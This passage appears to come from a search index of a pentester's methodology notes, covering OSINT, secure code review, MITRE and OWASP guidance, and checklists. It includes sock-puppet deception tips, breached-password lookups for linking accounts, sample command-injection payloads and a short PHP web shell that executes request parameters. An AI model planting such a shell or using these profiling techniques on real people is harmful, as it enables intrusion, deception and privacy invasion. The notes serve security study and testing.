    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Cross-Site Request Forgery (CSRF) cfed72aa195b445591d8136e77639136.html"
  },
  {
    "title": "SQL Injection",
    "body": "SQL Injection",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SQL Injection 5779668248fc41f9a174e20862211526/SQL Injection 119bc08c59b1491a84dde6fedb6467ed.html"
  },
  {
    "title": "OSINT Overview",
    "body": "OSINT Overview \n Taking notes: Keepnote \n Sock Puppets: Fake online accts or idententies Trying to prevent drawing attention back to ourselves Shouldnt be on devices or networks owned to you etc Creating a Sock puppet:  Fake full persona, history sock puppets highly elaborate known sock accounts because its obvious fake personalities fakenamegenerator.com Remember there are benefits to being a female easier to trust, seduce etc. thispersondoesnotexist.com generates fake AI person Using a new laptop, Burner phone, Privacy Credit cards privacy.com Dont use your own IP VPNs may work but may be detected make it match your location Try mobile networks as well",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/OSINT Overview 43af23eb0df949449612728279f78df8.html"
  },
  {
    "title": "Email OSINT",
    "body": "Email OSINT hunter.io Type in company name can get email patterns names linkedin Phonebook.cz email addresses take users and throw at login form clearbit has to be used in chrome give the company domain to find emails can sort by roles emalhippo tools.verifyemailaddress.io email-checker.net/validate possible false positives negatives Forgot passwords can see backup emails, phone # from forgot passwords. \n Password OSINT breachbin for password dump lookup see whose been involved in a breach slight or same passwords for same users different breaches \n dehashed.com takes money search for many different things trying to find patterns Tie accounts together. passwords and hashes hashes.org  - hash db?  maybe not legit weleakinfo.to/v2 leakcheck.io snusbase legit haveibeenpwned.com scylia.sh \n Hunting usernames and accounts: namechk.com find accounts on different sites whatsmyname.app mobile apps check the images and try to reverse image search try logging in to see if user exists full names\u2026 \n Searching for people: whitepages.com truepeoplesearch.com webme.com fastbackgroundcheck peekyou 411.com thatsthem.com  -ip address google \n Voter Records voterreocords.com Hunting phone # carriers try using hyphens, change syntax spelled out numbers emojis truecaller calleridtest.com yahoo forgot password CAREFUL: verification codes are being sent infobel.com Discovering birthdays google twitter posts intext: birthday  searching for resumes google images filtetype: drive.google scribd linkedin",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Email OSINT 1d6dc657e86c49d9b2cad0078aa75fce.html"
  },
  {
    "title": "Image OSINT",
    "body": "Image OSINT Reverse Image Searching: Google reverse image search all sizes etc Tineye, yandex Viewing EXIF Data: exchangable image file Data from images that can be traced back location, device exif.regex.info/exif.cgi Identifying Locations: license plates, parking, sides of roads, weather, buildings, architecture",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Image OSINT a8b41981df8e40dd8b9d5a3ea7e66ef3.html"
  },
  {
    "title": "Wireless OSINT",
    "body": "Wireless OSINT wigle.net wardriving wireless networks",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Wireless OSINT a507dfcb103d439c9fd9c0d8f80dae53.html"
  },
  {
    "title": "Search Engine OSINT",
    "body": "Search Engine OSINT \n Search engine operators: Search name in google\u2026 also duckduckgo, bing, yandex,baiidu changing search terms with synoyms Site:reddit.com AND, OR operator \u201c\u201d has to match string combination of all * wild card filetype:pdf,xlsx,docx think word alternatives\u2026 -WWW -remove opertor intext:password inurl: intitle: Advanced google searches can narrow down time, region, language etc",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Search Engine OSINT 2554b4dbc986444e93af383d75c64812.html"
  },
  {
    "title": "OSINT Tools",
    "body": "OSINT Tools Image and location: exif tool apt update\nsudo apt install libimage-exiftool-perl\nexiftool <image>  \n Emails and breached data: the Harvester theHarvester -d tcm-sec.com -b all\ntheHarvester -d tcm-sec.com -b google -l 100\n h8mail - connects to OSINT websites breach parse looking for specific target? \n Username and accounts: whatsmyname whatsmyname -u <user> sherlock sherlock <user> \n Phone numbers: phoneinfoga phoneinfoga scan -n 1<#> \n Social Media: twint twint -u <user> -s <keywords> \n Website: wappalyzer whois <> github httpprob github amass githubsubfinger github assetfinder githuber gowitness export GOPATH=$HOME/go\nexport GOROOT=/usr/lib/go\nexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin \n OSINT Frameworks: maltego recon-ng recon-ng\nmarketplace search (tools)\noptions set source <src> Hunchly hunch.ly paid only runs in google chrome \n OSINT reports: summary findings technical finding (duplcatible) pictures optional cover page ToC",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/OSINT Tools 5b428ba536844e09900801169b800a8e.html"
  },
  {
    "title": "Location",
    "body": "Location Google maps Satellite view look at surroundings for drones etc look for security, guard desks etc try to get street view smoke areas social engineering propped open doors how people are dressed, dress codes",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Location fa11ec25ae9741ce8746b38075850844.html"
  },
  {
    "title": "Business OSINT",
    "body": "Business OSINT linkedin: search company socials website job postings employees badges images employee image searches opencorperates.com filings",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Business OSINT d5979aa4d88b4618a81634936e0666bb.html"
  },
  {
    "title": "Website OSINT",
    "body": "Website OSINT google builtwith centralops.net domain and ip address lookup locations etc whois records dnslytics.com all domains that use that ip address spyonweb.com virustotal.com url search visualping.to backlinkwatch viewdns.info crt.sh \n \n Shodan.io \n archive.org  - wayback machine",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Website OSINT 7d37a939edb04789a0125c344895e618.html"
  },
  {
    "title": "Social Media OSINT",
    "body": "Social Media OSINT Twitter Look for likes, hobbies, college other SM, what other ppl are saying Search by name, @ symbol, from to and mentions, From: since:2019-02-01 until: geocode: advanced search Twitter tools: socialbearing.com twitonomy.com analytics.mentionmapp.com tweetbeaver - get twitter id spoonbill.io  - changes to profile tinfoleak.com tweekdeck   faebook intelx.io pagr src \u2192 user id insta wopita.com imginn.com google Snachat username search feautre snapchat maps reddit",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4/Social Media OSINT e85bbaba4c6043e89683a0f1159cfd57.html"
  },
  {
    "title": "Python",
    "body": "Python SQL Injection: \n XXE: \n \n Passwords stored in file: Any hardcoded credentials or keys in files? \n input output: \n \n Setting the cookie session-id to be the same as the client id is improper authentication \n \n Using Components From Untrusted Sources: Are all components from official repos and trusted sources? check requirements.txt \n \n Insufficient Logging and Monitoring: \n \n Server-Side Request Forgery:",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Code Review 063b90ddc6124adfb6a71739e97120ad/Python 672a40fef5994c6ebb98bfb72ef4b07a.html"
  },
  {
    "title": "MITRE",
    "body": "MITRE Resource Separation and Access Control This code block protects against software weaknesses such as  Missing/Incorrect Authorization Resource separation/segmentation minimizes the impact of an unauthorized\n access by limiting the resources that a certain user or role has access\n to. Resources can be network resources such as LANs or data resources such as different customer databases used in a SaaS offering. If an attacker obtains access to the account of an administrator for one\n of the resources they do not have access to the other resources in the \nsystem. Same approach can be applied to software development where URLs and other server resources can be segmented based on access. This approach also avoids logical attacks. For example if an application\n defines a class of servlets that can only be accessed by \nadministrators, \nthis reduces the risk of logical flaws being introduced because the \nauthorization logic can be simplified and declared in a base class. \"Divide the software into anonymous, normal, privileged, and \nadministrative areas. Reduce the attack surface by carefully mapping \nroles with data and functionality. \n        Use role-based access control (RBAC) [R.862.1] to enforce the \nroles at the appropriate boundaries.\nNote that this approach may not protect against horizontal \nauthorization, i.e., it will not protect a user from attacking others \nwith the same role.\" From MITRE  CWE 862 \n \n Authenticated by Default In order to avoid mistakes the software should be designed in such a way that new fuctionality is \n    automatically protected by authentication. Framework or server provided authentication should be used where possible while custom authentication should be avoided. In Java EE application configurations it is possible to protect \nresources using URL regular expression patterns by defining a \n<security-constraint> in the web.xml file. \nWhen this approach is taken you should be careful to not place any \nsensitive resources outside the protected folders. Another approach in Java EE is to use request filters which allow \nprocessing authentication on every single request. \nWhen implementing an authentication filter everything should be \nauthenticated by default and authentication logic should only be ignored\n on exception.\nThis will ensure that when a new resource is added it should benefit \nfrom authentication by default.\n\n Example authentication filter \n/**\nweb.xml definition\n<filter-mapping>\n    <filter-name>AuthenticationFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n*/\n\npublic class AuthenticationFilter implements Filter {\n\t/* (non-Java-doc)\n\t * @see java.lang.Object#Object()\n\t */\n\tpublic AuthenticationFilter() {\n\t\tsuper();\n\t}\n\n\t/* (non-Java-doc)\n\t * @see javax.servlet.Filter#init(FilterConfig arg0)\n\t */\n\tpublic void init(FilterConfig arg0) throws ServletException {\n\t\t// TODO Auto-generated method stub\n\t}\n\n\t/* (non-Java-doc)\n\t * @see javax.servlet.Filter#doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)\n\t */\n\tpublic void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {\n        if (req instanceof HttpServletRequest){\n            HttpServletRequest request = (HttpServletRequest)req;\n\n            if(isPublic(request)==false){ //isPublic runs the current request against a list of requests paths where authentication doesn't need to occur\n                String authToken = (String) request.getSession().getAttribute(\"authToken\");\n                //do some cookie validation here\n                Cookie[] cookies = request.getCookies();\n                boolean loggedIn = false;\n                if(cookies != null) {\n                    for (int i = 0; i < cookies.length; i++) {\n                        Cookie cookie=cookies[i];\n                        String cookieName = cookie.getName();\n                        String cookieValue = cookie.getValue();\n                        if(cookieName.equals(\"authToken\") && cookieValue.equals(authToken)) loggedIn = true;\n                    }\n                }\n\n                if (!loggedIn){\n                    ((HttpServletResponse)resp).sendRedirect(request.getContextPath()+\"/login.jsp\");\n                    return;\n                }\n            }\n        }\n        chain.doFilter(req, resp);\n\t}\n\n\t/* (non-Java-doc)\n\t * @see javax.servlet.Filter#destroy()\n\t */\n\tpublic void destroy() {\n\t\t// TODO Auto-generated method stub\n\t}\n\n}\n If neither of the options above can be implemented resources such as \nServlet classes should inherit from an AuthenticatedServlet class which \ncontains the authentication logic\nand executes it on every single request. This is more error prone but \nstill better than performing authentication logic within the code for \neach individual resource. \n \n Use Strong Data Encryption This code block protects against software weaknesses such as Missing Encryption of Sensitive Data Use of a Broken or Risky Cryptographic Algorithm Use of a One-Way Hash without a Salt \"When there is a need to store or transmit\n sensitive data, use strong, up-to-date cryptographic algorithms to \nencrypt that data. \n       Select a well-vetted algorithm that is currently considered to be\n strong by experts in the field, and use well-tested implementations. \n       \n       ...\n       \n        Do not develop custom or private cryptographic algorithms. They \nwill likely be exposed to attacks that are well-understood by \ncryptographers. \n        Reverse engineering techniques are mature. If the algorithm can \nbe compromised if attackers find out how it works, then it is especially\n weak.\n        Periodically ensure that the cryptography has not become \nobsolete. Some older algorithms, once thought to require a billion years\n of computing time, can now be broken in days or hours. \n        This includes MD4, MD5, SHA1, DES, and other algorithms that \nwere once regarded as strong.\" From MITRE  CWE 327 Encryption of data at rest Sensitive data stored locally should be encrypted to prevent both \nagainst physical theft and data leakage attacks. Sensitive data includes\n but not limited to: personally identifiable information (PII),\npasswords, confidential business information. The industry standard is to consider all passwords and encryption keys sensitive data. \nUser passwords should stored irreversible and be hashed using a salted adaptive algorithm. System passwords such as passwords to a database or LDAP server should \nbe encrypted with a strong cryptographic algorithm and using a \ndynamically generated key or a key obtained from a Hardware Security \nModule.\nSame approach should be taken for other data such as PII or confidential\n information. The table below lists approved algorithms for various types of data Type of data Approved algorithm Preferred algorithm DO NOT USE User passwords Salted SHA-2 class (SHA256 and up) Salted PBKDF2 with large number of rounds MD5, SHA1, Unsalted Reversible sensitive data Symmetric - AES256 CBC with dynamic key/iv (HSM), Asymmetric - RSA 2048 -- RSA claims that 1024 bit keys, no longer safe Symmetric - AES256 CTR or stronger with dynamic key (HSM), Asymmetric - RSA 4096 {xor},DES,AES 256 ECB for large data, hardcoded keys Sample hashing of a password using PBKDF2 /**\n* Generates the PBKDF hash for the string\n* @param password The password to be hashed\n* @param salt The salt used to make the password unknown to password cracking dictionaries\n* @param iterations The number of times to repeat the hashing algorithm on the resulting digest. Used to increase the time required to crack a passwords. The higher the number the longer the time required to crack.\n* @param derivedKeyLength The length of the resulting hash for example 64\n* @return\n* @throws NoSuchAlgorithmException\n* @throws InvalidKeySpecException\n*/\npublic static String getEncryptedPassword(String password, byte[] salt,  int iterations,  int derivedKeyLength) throws NoSuchAlgorithmException, InvalidKeySpecException {\n    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, iterations, derivedKeyLength * 8);\n\n    SecretKeyFactory f = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA256\");\n\n    byte[] hashBytes f.generateSecret(spec).getEncoded();\n\n    return Base64.getEncoder().encodeToString(hashBytes);\n}\n Encryption of data in transit It has become an industry standard to secure all communications. It is \nconsidered a vulnerability to send data in clear text (like in the case \nof the http:// urls). Other vulnerabilities\ninclude using flawed protocols or ciphers in the communication.\n\nIt is also a vulnerability to ignore invalid server certificates.\n\nHere is a list of the few notable vulnerablity disclosures in SSL/TLS \nprotocols and ciphers over the past few years. Bacronym Vulnerable Protocol or Cipher Reference POODLE SSLv3 Wikipedia article FREAK RSA_EXPORT keys Wikipedia article Logjam Diffie-Hellman key exchange Wikipedia article Protocol and cipher issues are addressed in the server configuration and the configuration of communication clients.\n\nThe public site SSLLabs allows users to test any public server for secure communication issues. \n Strong Login Verification These code blocks protect against software weaknesses such as  Improper Restriction of Excessive Authentication Attempts Two Factor Authentication (2FA) Using a secondary authentication mechanism such as an RSA ID or mobile \ntoken prevents a wide range of login attacks from Spoofing and Brute \nForce categories . Account Lockout The user account should become locked after more than 10 invalid login attempts at a minimum. \nThe event should be logged and the user should be automatically notified by e-mail of invalid activity to their account. Strong Passwords Requirements Weak passwords such as  admin  or  123456  should \nnot be allowed. Passwords should have a good amount of complexity. \nPassword meters should be used to guide users on how to generate a good \npassword during registration.\n\nLong passwords that are made up of random words like \n\"BlueBananaSubwayMeter\" are more secure than passwords with high \ncharacter complexity such as \"P@ssw0rd\" which are easily guessed.\n\nHowever note that compliance standards such as PCI specifically require a\n password makeup that includes both letters and numbers. Password Expiry Passwords should expire after less than three months to limit the amount\n of time they could be brute forced through an online brute force or \noffline cracking. Never hard-code passwords A hard-coded password cannot benefit from expiry, reset or lockout. \n \n Check Boundaries This secure coding practice prevents overflow attacks such as: Integer Overflow or Wraparound Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') Incorrect Calculation of Buffer Size Whenever user input is received developers should check that the input \ncannot be used to influence overflows on boundaries, whether it is \nMAX_INT or whether it is the maximum size allocated for a buffer. A simple comparison against a known limit constant can go a long way to prevent serious logical attacks. Interesting fact, Boeing had to fix a Integer \nOverflow in the 787 Dreamliner which could cause it's electrical system \nto fail according to \n     Engadget . \n \n Integrity Verification This code block protects against software weaknesses such as  Download of Code without Integrity Check Most communication protocols have some level of integrity checks built \nin, primarily to account for data degradation or corruption. \nThese mechanisms vary from simple checksums, to MD5 or SHA digests. Git,\n for example, implements a SHA-1 mechanism to identify commits. When security is involved developers should be concerned with attackers \npotentially intercepting update packages and replacing them with \nmalware. \nThis should be an expecially high concern for security software which \nare used to fight malware. The absence of integrity checks allows the \nmanipulation of update packages. Simple checksums and digests can be bypassed through collisions. MD5 collisions can be identified in 1 day while \nSHA-1 collisions can be identified in 1 year  as disclosed by Google researchers in 2017 . The importance of the Google discovery is significant since many SSL \ncertificates are signed with SHA-1 hashes for integrity. \nThis means that man-in-the-middle attackers with sufficient computing \npower could potentially create fake SSL certificates using a different \npublic key and break secure communications. Algorithms in the  SHA-2  class such as SHA-256 still \nremain safe until more computing power can break them. \nHowever even with SHA-256 there still remains the problem of \ntransmitting the hashes to the receiving party. If the hashes are \ntransmitted through a separate channel this channel should be secure. An approach that attempts to resolve this problem is using RSA \nsignatures in a similar way TLS communication works. Here is the process\n at a high level: The software update site provides a certificate which can be verified by a public authority such as Verisign The private key for this certificate is closely guarded and never shared with consumers of the software When new software is released the update package is hashed using a strong algorithm (SHA-256+) The hash is in turn signed with the private key that only the software provider knows The software signing certificate containing the public key is packaged along with the software and the signed hash When the software consumer downloads the package it first\nchecks that the certificate is valid (using the trusted Certificate\nauthority) Next the consumer uses the certificate public key to verify the signature and verifies the hash matches the update contents. The following tutorial covers digital signatures in Java:  Generating and Verifying Signatures \n Input Allow Listing Input Allow Listing  also known as Input Validation or Input Sanitization is a tenet of application security. \n    It is the single most important countermeasure that will prevent a large amount of attacks. Here are a few of the SANS 25 that are prevented or at least \nmitigated through Input Allow Listing. \n    Even if allow listing cannot be employed in some cases, if used for \nmost inputs it reduces the attack surface and the risk to the \napplication. URL Redirection to Untrusted Site ('Open Redirect') -- allow only specified urls Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') -- allow only alphanumeric Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')  -- allow only alphanumeric or allow only specified files Unrestricted Upload of File with Dangerous Type -- allow only safe file extensions Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') -- allow only alphanumeric Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') -- allow only alphanumeric Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') -- limit size Input Allow Listing vs. Input Block Listing The choice of using the term 'Allow Listing' instead of 'Validation'\n or 'Sanitization' was made to differentiate from the bad kind of \nvalidation: 'Block Listing'. Block listing involves blocking certain strings or characters. It \ncan almost always be defeated by skilled attackers. \n    You'd think it's better than nothing but you'd be wrong. Block \nlisting masks vulnerabilities for automated tools and testers that are \nless skilled. The example below tries to prevent a command injection attack (inspired from a real life scenario, the  ImageTragik bug  - translated to Java from C++)     String location=request.getParameter(\"location\");\n    if(location.indexOf(\";\")!=-1){\n        throw new Exception(\"Invalid character in location\"); //prevent adding commands to wget using the ; character: location=www.google.com;ls -la\n    }\n    else{\n        Runtime.getRuntime().exec(\"/bin/sh -c 'wget \"+location+\"'\");\n    }\n The attacker can still inject commands without the ; symbol, for example they can use the ` character:  location=www.google.com`ls -la` Input Allow Listing Rules All user input should be considered unsafe by default. The majority of input used in an application ends up being numeric or alphanumeric strings. \n    Even when other characters are required they are usually part of a limited set. \n    So only alphanumeric characters should be allowed by default while other can be added on exception. The example below implements input allow listing     public static boolean isAlphanumOrExcepted(in maxSize, String val, char ... excepted){\n        boolean result = true;\n        int count = val.length();\n        if(count>maxSize) return false;\n\n        for(int i=0;i<count;i++){\n        \tchar c = val.charAt(i);\n        \tboolean isOk = false;\n        \t//if  alphabetic turns true , this works for Unicode chars\n        \tisOk = isOk | Character.isAlphabetic(c);\n        \t//if it's a digit turns true, this works for Unicode chars\n        \tisOk = isOk | Character.isDigit(c);\n        \t//if it's in the list of exceptions turns true\n        \tfor(char ex : excepted){\n        \t\tisOk = isOk | ex==c;\n        \t}\n\n        \tif(isOk == false){ //if the character didn't meet the requirements return false\n        \t\treturn false;\n        \t}\n        }\n        return result;\n    }\n    //...\n    String location=request.getParameter(\"location\");\n    if(isAlphanumOrException(32, location,':','/','?')){\n        Runtime.getRuntime().exec(\"/bin/sh -c 'wget \"+location+\"'\"); //btw there is a better way to call shell commands which reduces the risk of command injection, see parameterized commands code block\n    }\n    else{\n        throw new Exception(\"Invalid character in location\"); //only allow a limited set of valid url characters\n    }\n In Node.js there's a handy validator package containing various validation techniques Input Allow Listing as a Framework If possible allow listing should be built into the \nAPI or Framework. \n    Ideally a new developer writing a new REST API should automatically \nbenefit from allow listing and only add extra characters or symbols as \nneeded. This can be done by introducing allow listing as part of the default\n data processing routines. \n    At a minimum a common validation class should be made available and \nused every time user input is accepted and be enforced as part of coding\n guidelines. The example below shows the implementation of a 'SafeGetParameter' function that can be reused to ensure validation      String userId=Util.SafeGetParameter(32,request,\"userId\",ValidatorConstants.ALPHA_NUM);\n Indirect Object References This code block can prevent several issues from the MITRE Top 25 list. URL Redirection to Untrusted Site ('Open Redirect') Unrestricted Upload of File with Dangerous Type Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') Using  indirect object references  \n(as opposed to direct object references) means that the user input is \nmanipulated\non the server side and compared to a list or a hashmap. The example \nbelow shows a hashmap of file resources for a server containing \ndocuments. Resource ID File Name 2543626326753473534754334347753434573 /var/www/myapp/files/docs/accounts.xls 9789694693274976937629462958605603862 /var/www/myappfiles/docs/proposal.doc When the application retrieves the file rather than using the actual \nfile name, it uses the resource id and keeps the actual file location \nsecret and immutable.\nIf the user attempts to manipulate the resource id it will have no \neffect.     String resourceId = Util.SafeGetParameter(request,\"resourceId\",ValidatorConstant.NUMERIC);\n    if(resourceId!=null){\n        BufferedReader fileReader = FileManager.mapResourceIdToFile(resourceId);\n    }\n During file upload, the application should ignore the file name provided by the user and replace it with a GUID. \n    This mitigates against both Path Traversal and Upload of Dangerous File Types. If the user provided file name must be maintained, like in the case of unzipping, \n    then the application should validate that the absolute file name resolves to an allowed directory. In a similar way indirect object references can be used for URL \nredirects either by maintaining a hashmap or by manipulation on the \nserver side that will neutralize\n    any non relative URLs. \n \n Forgery Prevention Token This countermeasure primarily prevents  Cross-Site Request Forgery  attacks but can also mitigate several other client side attacks. Open Redirect \"Reflected\" XSS Clickjacking The primary goal of the software defense is to cause the http requests to become unique to the user. \n    This is usually done through a request authentication token separate from cookies and platform authentication headers. The example below shows an HTTP request protected against CSRF. It is one of the requests from this site. GET /api/teams HTTP/1.1\nHost: localhost:8081\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://localhost:8081/main\nxsrfToken: EITPDAj48qzt2z5J6wE4uPn6iC3ggw8imBdIeeBwknWybC-SnPCmlTdmDIPM1XRJjgXv9Gfd1RSV1RbDkaRU1w\nCookie: connect.sid=s%3AieghQmy09PUrMqYqMBlfKSW5cA4RRsLE.90RDCtrG6aJoFC74R4OfuJYXKPiZEVLtHpfP6dMNQXs\nConnection: keep-alive\n\n The xsrfToken will be different for each user and an attacker will not \nbe able to store the request in an external site because they won't know\n it.\nEven if they knew the token they could only target a single user and the\n request would expire with the session limiting the ammount of time for \nthe attack. The countermeasure works for any other attacks where the attacker \nwould have to manipulate a request and e-mail it to a victim or store a \nrequest in an external site. A few CSRF token best practices: The token should be sufficiently long and unpredictable. It should not be transmitted as a query parameter. It's a bad practice to send tokens in the URL. It's best for the token to be different than the value of the cookies. Best location is as an extra header. This way all API requests (GET|POST|PUT|DELETE) can benefit from it.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Code Review 063b90ddc6124adfb6a71739e97120ad/MITRE 67cf8e59c603478c9a9b0498748a0ff7.html"
  },
  {
    "title": "Javascript",
    "body": "Javascript DOM-Based XSS: insertAdjacentHTML  without sanitization can lead to DOM based XSS \n Using methods such as  textContent \n is often a more appropriate solution when choosing the method of \ninserting user input into page elements, as this method perceives any \ngiven value as plain text rather than HTML or XML.\n\t\t\t\t\n\t\t\t\t\n\t\n\n\t\n\t\tThe sensitive information is stored in the cookies. If the site has an XSS vulnerability and cookies are not properly configured, an attacker will be able to get this data. The credit card and phone data can be used to steal user`s money.\n\t\t\n\t\n\t\t Dynamic code execution should be avoided. Using  JSON.parse  instead  eval  prevents insecure processing data. The JSON parser recognizes the JSON text and does not compile scripts.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Code Review 063b90ddc6124adfb6a71739e97120ad/Javascript e5407ae7b8fc4940ad59d640e251e6e8.html"
  },
  {
    "title": "Checklists",
    "body": "Checklists \n JavaScript Checklist: Validate and sanitize user input: Check for proper validation using regex or dedicated validation libraries like Validator.js Check for proper sanitization using libraries like DOMPurify or using built-in encoding functions (e.g.,  encodeURIComponent ) Protect against Cross-Site Scripting (XSS) vulnerabilities: Look for  innerHTML  or  document.write  usage, which may insert untrusted data into the DOM Check for proper output encoding when inserting user data into the DOM Secure AJAX and API calls: Verify usage of HTTPS for all API calls Check for proper authentication and authorization in API requests Look for Cross-Origin Resource Sharing (CORS) configurations and ensure they are restrictive Avoid using  eval()  and other unsafe functions: Check for usage of  eval() ,  setTimeout , and  setInterval  with string arguments Recommend safer alternatives like  JSON.parse()  or using a proper parser for the given data format Protect sensitive data (API keys, tokens, etc.): Search for hardcoded secrets (API keys, tokens, passwords) and recommend storing them securely Ensure secure handling of authentication tokens (e.g., HttpOnly cookies or secure JWT storage) Implement proper error handling: Check for proper error handling using try-catch blocks Ensure user-facing error messages do not expose sensitive information Follow secure coding practices for cookies and localStorage: Check for proper cookie flags (Secure, HttpOnly, SameSite) Avoid storing sensitive data in localStorage or implement proper encryption \n Java Checklist: Validate and sanitize user input: Check for proper validation using regex or dedicated validation libraries like Apache Commons Validator Check for proper sanitization using libraries like OWASP Java HTML Sanitizer or encoding functions (e.g.,  URLEncoder.encode ) Protect against SQL Injection: Look for proper usage of prepared statements or parameterized queries Avoid string concatenation when building SQL queries Safeguard sensitive data (encryption, secure storage): Check for proper encryption algorithms (e.g., AES) and key management Ensure secure storage of sensitive data (e.g., using encrypted databases or secure system properties) Implement proper error handling: Check for proper error handling using try-catch blocks Ensure user-facing error messages do not expose sensitive information Follow secure coding practices for authentication and authorization: Verify proper password hashing (e.g., using bcrypt or Argon2) Check for secure session management (e.g., secure cookies, session timeouts) Safeguard against insecure deserialization: Check for proper validation and filtering when deserializing data Avoid usage of insecure deserialization libraries or functions (e.g.,  ObjectInputStream ) Secure network communications (SSL/TLS): Verify usage of HTTPS for all network communications Check for proper SSL/TLS configurations (e.g., hostname verification, secure cipher suites) \n Android Checklist: Validate and sanitize user input: Check for proper validation using regex or dedicated validation libraries like Android Saripaar Check for proper sanitization using libraries like Jsoup or encoding functions (e.g.,  URLEncoder.encode ) Protect against insecure data storage (SharedPreferences, etc.): Look for sensitive data stored in SharedPreferences, unprotected databases, or internal storage Recommend secure alternatives like EncryptedSharedPreferences, encrypted databases (e.g., SQLCipher), or Android Keystore Secure network communications (SSL/TLS): Verify usage of HTTPS for all network communications Check for proper SSL/TLS configurations (e.g., hostname verification, secure cipher suites) Look for possible certificate pinning implementation Safeguard sensitive data (encryption, secure storage): Check for proper encryption algorithms (e.g., AES) and key management Ensure secure storage of sensitive data (e.g., using Android Keystore or encrypted databases) Follow secure coding practices for Intents and exported components: Check for proper protection of exported components (e.g., Activities, Services, BroadcastReceivers) using permissions or Intent filters Verify secure usage of Intents, avoiding data leakage or unauthorized access Implement proper error handling: Check for proper error handling using try-catch blocks Ensure user-facing error messages do not expose sensitive information Protect against insecure WebView usage: Look for WebView configurations that enable JavaScript or allow mixed content Verify that the WebView does not load untrusted content, and check for proper URL validation Check for secure implementation of JavaScript interfaces and ensure they don't expose sensitive data or functionality \n \n ETC: CSRF? XXE SQL BAC - (admin page bypass, redirect bypasses) Authorization broken? (uprgade to admin priv via changing req?)",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Code Review 063b90ddc6124adfb6a71739e97120ad/Checklists 134b8d9d672a4b2cb603c87d74fdfcbc.html"
  },
  {
    "title": "OWASP Guide Notes",
    "body": "OWASP Guide Notes \n Injection SQL parses can not distinguish code from data This is the cause of SQL injections Because devs concatenate strings to form SQL queries, an attacker can modify the SQL statement with their input data. \n \n Prevention: HtmlEncode all user input. Using static analysis tools. Most static analysis for languages like .Net, Java, python are accurate. However\nstatic analysis can become an issue when injection comes from JavaScript and CSS. Parameterize SQL queries. Use SQL methods provided by the programming language or framework that\nparameterize the statements, so that the SQL parser can distinguish between code and data.\nA1 INJECTION\nString custQuery = SELECT custName, address1 FROM cust_table WHERE custID= \u2018\u201c + request.GetParameter(\u201cid\u201d) + \u201c\u201c\nCode Data45 Use Stored Procedures. Stored procedures will generally help the SQL parser differentiate code and data.\nHowever Stored Procedures can be used to build dynamic SQL statements allowing the code and data to become blended together causing the it to become vulnerable to injection. Provide developer training for best practices for secure coding",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Code Review 063b90ddc6124adfb6a71739e97120ad/OWASP Guide Notes b4efc14ce6c141e29e20384a42e27c63.html"
  },
  {
    "title": "Web Shells",
    "body": "Web Shells Sometimes web shells require cmd /c instead of taking the whole command cmd /c whoami \n \n php  <?php\necho \"<pre>\";\npasshtru($_GET['cmd']);\nsystem($_GET['cmd']);\nshell_exec($_GET['cmd']);\nexec($_GET['cmd']);\npOpen($_GET['cmd']);\neval(\"phpinfo()\")\n\necho\"</pre>\"\n?>",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/JSON Web Tokens (JWT) 4af78d6b33c747c4b0ef117daa8ed03f/Web Shells 80de002ac84e43a28b5c6605c778b031.html"
  }
]
}